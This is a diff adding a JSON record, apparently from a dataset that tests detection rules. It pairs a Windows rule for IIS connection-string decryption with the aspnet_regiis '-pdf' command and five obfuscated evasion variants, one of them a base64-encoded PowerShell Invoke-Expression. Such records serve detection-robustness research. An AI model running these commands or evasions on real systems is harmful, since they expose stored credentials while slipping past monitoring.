@@ -1,0 +1,11 @@
+{
+  "rule_name": "proc_creation_win_iis_connection_strings_decryption_0",
+  "original_command": "\\aspnet_regiis.exe aspnet_regiis.exe connectionStrings -pdf",
+  "evasions": {
+    "insertion": "\\aspnet_regiis.exe aspnet_regiis.exe connectionStrings \\\"-\\\"\\\"p\\\"\\\"d\\\"\\\"f\\\"",
+    "substitution": "\\aspnet_regiis.exe aspnet_regiis.exe connectionStrings -pdf #substitution",
+    "omission": "\\aspnet_regiis aspnet_regiis connectionStrings -pdf",
+    "reordering": "\\aspnet_regiis.exe connectionStrings aspnet_regiis.exe -pdf",
+    "recoding": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('XGFzcG5ldF9yZWdpaXMuZXhlIGFzcG5ldF9yZWdpaXMuZXhlIGNvbm5lY3Rpb25TdHJpbmdzIC1wZGY=')) | Invoke-Expression\" "
+  }
+}
